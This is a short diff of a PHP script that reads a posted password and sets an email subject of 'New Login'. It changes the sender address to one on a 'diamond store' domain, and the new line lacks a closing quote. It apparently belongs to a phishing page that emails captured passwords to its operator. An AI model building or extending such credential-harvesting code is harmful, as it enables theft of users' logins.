@@ -6,7 +6,7 @@ $password = $_POST['password'];
 
 
 
-$email_from = 'rakibulislamrovin@gmail.com';
+$email_from = 'info@ffdiamondstorebd.github.io;
 
 $email_subject = 'New Login'
 
